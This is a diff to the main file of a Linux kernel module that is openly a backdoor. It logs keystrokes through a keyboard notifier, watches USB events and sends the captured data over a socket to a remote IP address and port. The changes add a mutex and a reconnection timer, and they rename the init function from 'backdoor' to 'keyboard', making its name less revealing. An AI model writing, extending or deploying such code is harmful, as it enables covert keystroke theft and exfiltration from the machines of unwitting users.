@@ -5,6 +5,8 @@
 #include <linux/irq.h>
 #include <linux/interrupt.h>
 #include <linux/delay.h>
+#include <linux/timer.h>
+#include <linux/mutex.h>
 
 #include "networking.h"
 #include "keyboardLogger.h"
@@ -17,15 +19,19 @@ MODULE_AUTHOR("Artur Brenner Weber");
 MODULE_DESCRIPTION("A module that sends specific kernel information via socket to another machine");
 MODULE_VERSION("0.1");
 
-static int __init backdoor_module_init(void) {
+
+static int __init keyboard_module_init(void) {
     int result;
 
-    //Socket Initialization
+    mutex_init(&socks_mutex);
+
     result = create_socket(IP_ADDRESS, PORT);
     if (result < 0) {
         printk(KERN_ERR "Failed to connect\n");
         return result;
     }
+
+    timer_setup(&connection_timer, initialize_conn, 0);
 
     // Keyboard Logger Initialization
     result = register_keyboard_notifier(&keyboard_notifier_block);
@@ -45,8 +51,8 @@ static void __exit backdoor_module_exit(void) {
     int ret;
     // Unregister the keyboard notifier
     unregister_keyboard_notifier(&keyboard_notifier_block);
-    ret = shutdown_socket();
 
+    ret = shutdown_socket();
     if (ret < 0) {
 	    printk(KERN_ERR "Unable to release socket");
 	    return;
@@ -54,6 +60,8 @@ static void __exit backdoor_module_exit(void) {
 
     //Unregister the USB notifier
     usb_unregister_notify(&usb_notifier);
+    del_timer(&connection_timer);
+    mutex_destroy(&socks_mutex);
 
     printk(KERN_INFO "Backdoor module exited\n");
 }
